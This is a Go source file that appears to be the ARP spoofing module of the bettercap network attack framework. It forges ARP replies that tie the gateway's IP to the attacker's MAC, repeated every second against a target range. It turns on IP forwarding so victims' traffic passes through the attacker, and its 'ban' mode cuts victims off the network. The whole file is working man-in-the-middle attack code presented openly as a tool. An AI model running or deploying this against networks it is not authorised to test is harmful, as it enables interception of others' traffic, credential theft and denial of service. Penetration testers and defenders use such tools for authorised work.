package modules

import (
	"fmt"
	"net"
	"time"

	"github.com/bettercap/bettercap/log"
	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"

	"github.com/malfunkt/iprange"
)

type ArpSpoofer struct {
	session.SessionModule
	done      chan bool
	addresses []net.IP
	ban       bool
}

func NewArpSpoofer(s *session.Session) *ArpSpoofer {
	p := &ArpSpoofer{
		SessionModule: session.NewSessionModule("arp.spoof", s),
		done:          make(chan bool),
		addresses:     make([]net.IP, 0),
		ban:           false,
	}

	p.AddParam(session.NewStringParameter("arp.spoof.targets", session.ParamSubnet, "", "IP addresses to spoof."))

	p.AddHandler(session.NewModuleHandler("arp.spoof on", "",
		"Start ARP spoofer.",
		func(args []string) error {
			return p.Start()
		}))

	p.AddHandler(session.NewModuleHandler("arp.ban on", "",
		"Start ARP spoofer in ban mode, meaning the target(s) connectivity will not work.",
		func(args []string) error {
			p.ban = true
			return p.Start()
		}))

	p.AddHandler(session.NewModuleHandler("arp.spoof/ban off", "arp\\.(spoof|ban) off",
		"Stop ARP spoofer.",
		func(args []string) error {
			return p.Stop()
		}))

	return p
}

func (p ArpSpoofer) Name() string {
	return "arp.spoof"
}

func (p ArpSpoofer) Description() string {
	return "Keep spoofing selected hosts on the network."
}

func (p ArpSpoofer) Author() string {
	return "Simone Margaritelli <evilsocket@protonmail.com>"
}

func (p *ArpSpoofer) sendArp(saddr net.IP, smac net.HardwareAddr, check_running bool, probe bool) {
	for _, ip := range p.addresses {
		if check_running && p.Running() == false {
			return
		} else if p.Session.Skip(ip) == true {
			log.Debug("Skipping address %s from ARP spoofing.", ip)
			continue
		}

		// do we have this ip mac address?
		hw, err := findMAC(p.Session, ip, probe)
		if err != nil {
			log.Debug("Error while looking up hardware address for %s: %s", ip.String(), err)
			continue
		}

		if err, pkt := packets.NewARPReply(saddr, smac, ip, hw); err != nil {
			log.Error("Error while creating ARP spoof packet for %s: %s", ip.String(), err)
		} else {
			log.Debug("Sending %d bytes of ARP packet to %s:%s.", len(pkt), ip.String(), hw.String())
			p.Session.Queue.Send(pkt)
		}
	}
}

func (p *ArpSpoofer) unSpoof() error {
	from := p.Session.Gateway.IP
	from_hw := p.Session.Gateway.HW

	log.Info("Restoring ARP cache of %d targets.", len(p.addresses))

	p.sendArp(from, from_hw, false, false)

	return nil
}

func (p *ArpSpoofer) Configure() error {
	var err error
	var targets string

	if err, targets = p.StringParam("arp.spoof.targets"); err != nil {
		return err
	}

	list, err := iprange.Parse(targets)
	if err != nil {
		return fmt.Errorf("Error while parsing arp.spoof.targets variable '%s': %s.", targets, err)
	}
	p.addresses = list.Expand()

	if p.ban == true {
		log.Warning("Running in BAN mode, forwarding not enabled!")
		p.Session.Firewall.EnableForwarding(false)
	} else if p.Session.Firewall.IsForwardingEnabled() == false {
		log.Info("Enabling forwarding.")
		p.Session.Firewall.EnableForwarding(true)
	}

	return nil
}

func (p *ArpSpoofer) Start() error {
	if err := p.Configure(); err != nil {
		return err
	}

	return p.SetRunning(true, func() {
		from := p.Session.Gateway.IP
		from_hw := p.Session.Interface.HW

		log.Info("ARP spoofer started, probing %d targets.", len(p.addresses))

		for p.Running() {
			p.sendArp(from, from_hw, true, false)
			time.Sleep(1 * time.Second)
		}

		p.done <- true
	})
}

func (p *ArpSpoofer) Stop() error {
	return p.SetRunning(false, func() {
		log.Info("Waiting for ARP spoofer to stop ...")
		<-p.done
		p.unSpoof()
		p.ban = false
	})
}
